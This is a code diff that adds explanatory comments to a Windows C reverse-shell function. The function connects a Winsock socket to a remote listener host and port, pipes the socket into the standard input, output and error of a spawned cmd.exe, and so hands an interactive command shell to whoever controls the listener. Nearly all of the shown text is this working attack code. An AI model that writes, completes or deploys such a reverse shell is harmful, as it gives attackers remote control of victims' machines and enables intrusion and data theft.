@@ -6,13 +6,14 @@
 
 #pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library
 
+// Function to establish reverse shell connection and spawn a command shell
 void reverse_shell(const char* lhost, const int lport) {
     WSADATA wsaData;
     SOCKET sock;
     struct sockaddr_in server;
     PROCESS_INFORMATION pi;
     STARTUPINFO si;
-    char *cmd = "cmd.exe";
+    char *cmd = "cmd.exe";  // Shell to run (cmd.exe)
 
     // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -27,6 +28,7 @@ void reverse_shell(const char* lhost, const int lport) {
         return;
     }
 
+    // Set up server address
     server.sin_family = AF_INET;
     server.sin_port = htons(lport);
     server.sin_addr.s_addr = inet_addr(lhost);  // Convert LHOST IP to network byte order
@@ -37,13 +39,13 @@ void reverse_shell(const char* lhost, const int lport) {
         return;
     }
 
-    // Initialize the STARTUPINFO structure
+    // Set up STARTUPINFO structure to redirect input/output to socket
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = (HANDLE)sock;
-    si.hStdOutput = (HANDLE)sock;
-    si.hStdError = (HANDLE)sock;
+    si.hStdInput = (HANDLE)sock;   // Redirect stdin to socket
+    si.hStdOutput = (HANDLE)sock;  // Redirect stdout to socket
+    si.hStdError = (HANDLE)sock;   // Redirect stderr to socket
 
     // Create a new process to run cmd.exe
     if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
